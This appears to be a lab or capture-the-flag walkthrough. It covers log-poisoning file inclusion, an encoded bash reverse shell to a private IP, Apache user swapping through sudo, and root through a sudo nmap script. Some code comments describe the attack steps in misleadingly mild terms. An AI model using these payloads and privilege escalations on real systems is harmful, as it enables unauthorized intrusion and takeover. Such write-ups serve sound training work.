#### Recap
Only SSH and HTTP were exposed. A hidden PHP endpoint allowed local file inclusion. The account listing identified Natraj and Mahakal, but no private key was recovered. Apache configuration showed that the application could reach logs containing attacker-influenced data.
```bash
# Assess whether the SSH authentication log contains attacker-controlled data
echo -e "<?php system(\$_REQUEST['cmd']) ?>\n" | nc -nv 192.168.119.80 22

# Assess whether the vulnerable PHP endpoint evaluates the log content
echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwOC80NDQ0IDA%2bJjEK
+|base64+-d|bash
```
The file inclusion and log handling flaws yielded a shell as www-data and the first flag.

The web service account could edit Apache configuration and restart the service through sudo. That combination let a low-privilege account control which local identity processed requests.
```bash
# Prepare a working copy of the configuration
cp apache2.conf /tmp/apache2.conf

# Review the configured worker user and group
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' /tmp/apache2.conf
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' /tmp/apache2.conf

# Apply the configuration change
cat /tmp/apache2.conf > apache2.conf

# Restart Apache through the permitted sudo rule
sudo /bin/systemctl restart apache2
```
Restarting Apache terminated the original session. The same application flaw yielded a new session under the configured Mahakal identity.
Rechecking sudo under Mahakal revealed a passwordless Nmap rule. I reviewed the capabilities it exposed.
```bash
echo 'os.execute("/bin/sh");' > /tmp/lpe
sudo nmap --script=/tmp/lpe
```
Privileged Nmap script execution yielded root access and the second flag.


Key concept one: SSH authentication events may be recorded in auth.log or the system journal, depending on the distribution and configuration.
Key concept two: A service may log data that its normal client rejects. Treat those logs as untrusted input.
Key concept three: In-place editors may require directory write permission even when the target file itself is writable.
Key concept four: A privileged Apache parent process applies the configured user and group when starting workers.
